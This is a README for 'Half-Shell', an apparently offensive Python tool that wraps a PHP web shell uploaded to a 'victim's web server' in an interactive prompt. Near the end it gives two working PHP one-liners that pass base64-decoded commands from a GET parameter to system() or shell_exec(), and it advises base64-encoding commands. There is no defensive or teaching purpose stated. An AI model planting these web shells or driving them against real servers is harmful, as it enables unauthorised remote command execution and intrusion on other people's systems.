# Half-Shell

Half-Shell is a simple python script to give the user a native looking prompt for communicating with uploaded $_GET php scripts.

### Prerequisites

Uses python's requests module. If you're not familiar with requests, it's more lightweight and usable compared to urllib or urllib2. More about requests can be found here: https://2.python-requests.org//en/master/

```
pip install requests
```

## Additional Info
![HELP](https://github.com/Mr-BeardFace/Images/blob/master/halfshell1.PNG)

Once a php $_GET has been uploaded onto a victim's web server, half-shell can be used to interact with the php shell that feels seamless to the user. Lame man's terms... you won't have to copy/paste commands ever 10 seconds.

Using half-shell is pretty straight forward. Enter in the url, including the location of your cmd (or otherwise) variable. If you are base64 encoding your commands (which I suggest you do) just add 'base64' to the end of the command. Other encodings are currently being looked at and could possibly be added later.

For base64 encoded commands, the below are the best php one-liners to use. Others tend to not echo correctly, or do not return any data.

```
<?php system(base64_decode($_GET['cmd']));?>
<?php echo shell_exec(base64_decode($_GET['cmd']));?>
```

